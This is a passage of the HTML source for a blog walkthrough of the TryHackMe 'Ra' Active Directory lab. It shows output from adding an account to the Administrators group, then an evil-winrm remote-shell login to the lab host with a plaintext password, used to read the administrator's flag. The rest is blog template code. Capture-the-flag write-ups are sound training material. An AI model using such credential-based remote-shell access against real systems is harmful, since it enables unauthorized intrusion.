class="string">Workstations allowed         All</span></span><br><span class="line"><span class="string">Logon script</span></span><br><span class="line"><span class="string">User profile</span></span><br><span class="line"><span class="string">Home directory</span></span><br><span class="line"><span class="string">Last logon                   Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon hours allowed          All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Local Group Memberships      *Administrators</span></span><br><span class="line"><span class="string">Global Group memberships     *Domain Users</span></span><br><span class="line"><span class="string">The command completed successfully.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\scripts&gt; </span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> evil<span class="literal">-winrm</span> <span class="literal">-i</span> <span class="number">10.10</span>.<span class="number">248.134</span> <span class="literal">-u</span> crazy <span class="literal">-p</span> qwe123456!</span><br><span class="line"></span><br><span class="line">Evil<span class="literal">-WinRM</span> shell v3.<span class="number">4</span></span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="function"><span class="keyword">function</span> <span class="title">is</span> <span class="title">unimplemented</span> <span class="title">on</span> <span class="title">this</span> <span class="title">machine</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Data</span>: <span class="keyword">For</span> more information, check Evil<span class="literal">-WinRM</span> Github: https://github.com/Hackplayers/evil<span class="literal">-winrm</span><span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\crazy\Documents&gt; <span class="built_in">cat</span> ../../administrator/desktop/Flag3.txt</span><br></pre></td></tr></table></figure>
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/TryHackMe/" class="category-chain-item">TryHackMe</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Active-Directory/" class="print-no-link">#Active Directory</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>TryHackMe Walkthrough - Ra</div>
+      <div>https://crazyinside.github.io/post/TryHackMe-Ra.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>World'sEnd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/TryHackMe-RazorBlack.html" title="TryHackMe Walkthrough - RazorBlack">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">TryHackMe Walkthrough - RazorBlack</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/TryHackMe-Ra2.html" title="TryHackMe Walkthrough - Ra2">
+                        <span class="hidden-mobile">TryHackMe Walkthrough - Ra2</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
